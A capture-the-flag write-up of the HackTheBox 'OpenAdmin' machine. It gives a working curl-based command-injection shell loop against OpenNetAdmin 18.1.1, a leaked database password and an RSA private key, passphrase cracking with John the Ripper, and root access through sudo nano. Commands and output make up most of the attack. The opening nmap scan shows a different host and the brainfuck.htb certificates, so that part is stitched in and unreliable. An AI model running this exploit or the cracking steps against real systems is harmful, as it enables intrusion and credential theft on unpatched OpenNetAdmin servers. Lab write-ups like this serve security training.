---
title: "OpenAdmin Writeup – HackTheBox"
date: 2020-03-02
tags: [HackTheBox, Penetration Testing]
excerpt: "Hack The Box, Penetration Testing"
mathjax: "true"
---
<img src="/images/OpenAdmin-Writeup/OpenAdmin.png" style="display: block; margin: auto;" />

# Scanning

```bash 
nmap -sV -A -sC -T4 -v -oN Scan.nmap 10.10.10.171
Nmap scan report for 10.10.10.17
Host is up (0.13s latency).
Not shown: 995 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: RESP-CODES SASL(PLAIN) CAPA PIPELINING TOP USER AUTH-RESP-CODE UIDL
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: post-login more have ENABLE listed LITERAL+ Pre-login OK IDLE LOGIN-REFERRALS AUTH=PLAINA0001 capabilities SASL-IR IMAP4rev1 ID
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-04-13T11:19:29
| Not valid after:  2027-04-11T11:19:29
| MD5:   cbf1 6899 96aa f7a0 0565 0fc0 9491 7f20
|_SHA-1: f448 e798 a817 5580 879c 8fb8 ef0e 2d3d c656 cb66
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
```



``` bash 
gobuster dir -u 10.10.10.171 -w /opt/SecLists/Discovery/Web-Content/big.txt -t 5
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171
[+] Threads:        5
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================                                                                                                                                          
2020/01/15 02:43:02 Starting gobuster                                                                                                                                                                    
===============================================================                                                                                                                                          
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/artwork (Status: 301)
/music (Status: 301)
/server-status (Status: 403)
/sierra (Status: 301)
[ERROR] 2020/01/15 02:51:26 [!] Get http://10.10.10.171/und: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
===============================================================
2020/01/15 02:52:17 Finished                                                                                                                                                                             
===============================================================   
   ```

We found a system called OpenNetAdmin, which is a system to maintain automation for networks changes in an environment. Click here for more.

After simple search, we found Remote Code Execution exploit online against the system version 18.1.1.


``` bash 
URL="http://10.10.10.171/ona/"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&amp;xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail>
done
```

We ca now run the script, and we will get unstable shell. We could navigate through the box only by “ls”, “cd” and “cat” which is a bit frustrating.

After a deep enumeration, we found an interesting credentials for a database in ‘/opt/ona/www/local/config/database_settings.inc.php’

``` php
$ cat /opt/ona/www/local/config/database_settings.inc.php
<?php
 
$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

With a bit of enumeration, in the “/home” directories we found two users:

``` bash
$ ls /home
jimmy
joanna
```

Tried to SSH each of them with the database password that we found, and we got “jimmy” to connect via SSH.


``` bash
root@kali:~/Desktop/HackTheBox/OpenAdmin# ssh jimmy@10.10.10.171
jimmy@10.10.10.171's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
 
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
 
  System information as of Thu Feb  6 19:46:28 UTC 2020
 
  System load:  0.0               Processes:             107
  Usage of /:   49.3% of 7.81GB   Users logged in:       0
  Memory usage: 17%               IP address for ens160: 10.10.10.171
  Swap usage:   0%
 
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
 
41 packages can be updated.
12 updates are security updates.
Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
 
jimmy@openadmin:~$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
jimmy@openadmin:~$ 

```

We found internals files of the system in the “/var/www/internal” path.

``` bash
jimmy@openadmin:~$ cd /var/www/internal
jimmy@openadmin:/var/www/internal$ ls
index.php  logout.php  main.php
```

Checking “index.php” file.



``` php
<body>
 
   <h2>Enter Username and Password</h2>
   <div class = "container form-signin">
     <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
       <?php
         $msg = '';
 
         if (isset($_POST['login']) &amp;&amp; !empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) {
           if ($_POST['username'] == 'jimmy' &amp;&amp; hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
               $_SESSION['username'] = 'jimmy';
               header("Location: /main.php");
           } else {
               $msg = 'Wrong username or password.';
           }
         }
      ?>
   </div> <!-- /container -->
```

The username is hard-coded in the PHP code alongside with the password that is stored in the “main.php” file.

Lets Curl “main.php” to reveal what inside it.

``` bash
jimmy@openadmin:/var/www/internal$ curl http://127.0.0.1/main.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 80</address>
</body></html>
```

We got 404 error with the default 80 port. Lets check the opened port in the machine.

``` bash
jimmy@openadmin:/var/www/internal$ netstat -ltun
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                         

```

There are bunch of services that are running in the box such as DNS, MySQL, Web server and SSH. There also 52846 port which is a dynamic port that I tried first:


``` bash
curl http://127.0.0.1:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
 
kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session

```

Now we got a private key! I tried to ssh to the other user “joanna” with this private key, but it need a passphrase.



``` bash
root@kali:~/Desktop/HackTheBox/OpenAdmin# ssh joanna@10.10.10.171 -i private_key 
Enter passphrase for key 'private_key': 
```
Lets try to crack it with JohnTheRipper tool, but first we need to convert the key to hash.

This could be accomplished via John also ssh2john script. IF you are using Kali Linux, try to locate it:

``` bash
root@kali:~/Desktop/HackTheBox/OpenAdmin# locate ssh2john
/usr/share/john/ssh2john.py       
 
root@kali:~/Desktop/HackTheBox/OpenAdmin# /usr/share/john/ssh2john.py private_key hash_file > hash_file
[hash_file] couldn't parse keyfile
root@kali:~/Desktop/HackTheBox/OpenAdmin# cat hash_file 
private_key:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1
 
```

I used “rockyou.txt” dictionary to crack the hash.


``` bash
root@kali:~/Desktop/HackTheBox/OpenAdmin# john --wordlist=/opt/rockyou.txt hash_file 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (private_key)
1g 0:00:00:06 DONE (2020-02-06 19:29) 0.1644g/s 2358Kp/s 2358Kc/s 2358KC/s *7¡Vamos!
Session completed
```

The passphrase cracked “bloodninjas“. Lets login as Joanna via SSH with the private key and enter the passphrase that we just cracked.

``` bash
root@kali:~/Desktop/HackTheBox/OpenAdmin# ssh joanna@10.10.10.171 -i private_key 
Enter passphrase for key 'private_key': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
 
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
 
  System information as of Thu Feb  6 20:34:30 UTC 2020
 
  System load:  0.0               Processes:             111
  Usage of /:   49.6% of 7.81GB   Users logged in:       0
  Memory usage: 26%               IP address for ens160: 10.10.10.171
  Swap usage:   0%
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
41 packages can be updated.
12 updates are security updates.
 
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
 
Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
joanna@openadmin:~$ ls
user.txt
joanna@openadmin:~$ cat user.txt 
c9b2cf07d40807e62af62660f0c81b5f
```

We got the user flag! Now lets enumerate and see how we could escalate the privileges to root.

# Root

``` bash
oanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

That indicate we can run nano text editor as super user. So we can read files that are in the root directory, for example! lets read the root flag file “root.txt” in the root directory.

<img src="/images/OpenAdmin-Writeup/OpenAdmin_root.gif" style="display: block; margin: auto;" />

And we got the root flag.

## FI
